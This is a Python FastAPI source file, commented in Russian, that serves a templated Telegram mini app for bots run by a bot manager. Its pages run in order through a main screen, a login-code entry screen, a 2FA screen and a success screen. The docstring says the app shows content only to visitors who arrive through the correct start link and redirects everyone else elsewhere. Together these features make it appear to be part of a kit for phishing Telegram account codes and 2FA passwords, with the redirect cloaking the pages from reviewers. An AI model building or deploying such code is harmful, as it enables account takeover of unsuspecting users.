"""
FastAPI-приложение мини-аппа.

Отдаёт:
  • GET /app/{bot_id}            — страницу мини-аппа (Telegram WebApp).
    Внутри страница зовёт /dl/{bot_id}/auth/start: правильная startapp-ссылка
    → показывает контент, иначе редиректит на сторонний ресурс.
  • роуты модуля «Прямая ссылка» (/dl/...).

bot_id в URL — это telegram-id дочернего бота (event.bot.id). Именно такой
Web App URL (<BASE>/app/<tg_id>) нужно указать в @BotFather.

Запускается опционально (RUN_WEB=1). Нужен HTTPS-домен (его даёт Railway).
"""

from __future__ import annotations

import json
from pathlib import Path

from fastapi import FastAPI
from fastapi.responses import HTMLResponse

from database import get_bot_by_tg_id, get_template, init_db
from directlink_service import get_module
from miniapp_template import (
    ALL_DEFAULTS,
    DEFAULT_VIEW,
    PAGE_FIELDS,
    PAGES,
    background_css,
    page_field_key,
)

_MINIAPP_HTML = (Path(__file__).parent / "miniapp.html").read_text(encoding="utf-8")


def _miniapp_config(bot_id: int) -> dict:
    """Оформление и контент всех страниц (листов) мини-аппа из шаблона бота.

    Отдаём страницы в порядке прохождения (Главная → Ввод кода → 2FA →
    Успех), каждую со всеми под-полями и подстановкой дефолтов «Стандартного
    шаблона». Мини-апп проигрывает их по кнопкам — для проверки рендера и
    параметров; бекенд-логика (проверка кода/2FA) подключается отдельно.
    """
    cfg: dict = {"color": "", "bg": "", "blur": 0, "view": DEFAULT_VIEW, "pages": []}
    content: dict = {}
    bot = get_bot_by_tg_id(bot_id)
    if bot and bot.get("template_id"):
        t = get_template(bot["template_id"])
        if t:
            content = t["content"]

    def _val(key: str) -> str:
        v = content.get(key)
        if v is not None and str(v).strip():
            return v
        return ALL_DEFAULTS.get(key, "")

    color = content.get("ui_color") or ""
    cfg["color"] = "" if color in ("", "default") else color
    # bg в шаблоне — id градиента / готовый градиент / URL; отдаём готовый CSS
    cfg["bg"] = background_css(content.get("bg"))
    cfg["blur"] = int(content.get("blur") or 0)
    cfg["view"] = content.get("view") or DEFAULT_VIEW
    for page in PAGES:  # порядок: main, code, twofa, success
        pdata = {"key": page}
        for field, _label in PAGE_FIELDS[page]:
            pdata[field] = _val(page_field_key(page, field))
        cfg["pages"].append(pdata)
    return cfg


def create_app() -> FastAPI:
    init_db()
    app = FastAPI(title="Bot Manager — Mini App")

    @app.get("/health")
    async def health() -> dict:
        return {"ok": True}

    @app.get("/app/{bot_id}", response_class=HTMLResponse)
    async def mini_app(bot_id: int) -> HTMLResponse:
        cfg = _miniapp_config(bot_id)
        # экранируем '<', чтобы JSON не закрыл <script>
        cfg_json = json.dumps(cfg, ensure_ascii=False).replace("<", "\\u003c")
        page = _MINIAPP_HTML.replace("__BOT_ID__", str(bot_id))
        page = page.replace("__CFG__", cfg_json)
        return HTMLResponse(page)

    get_module().mount(app)
    return app


app = create_app()
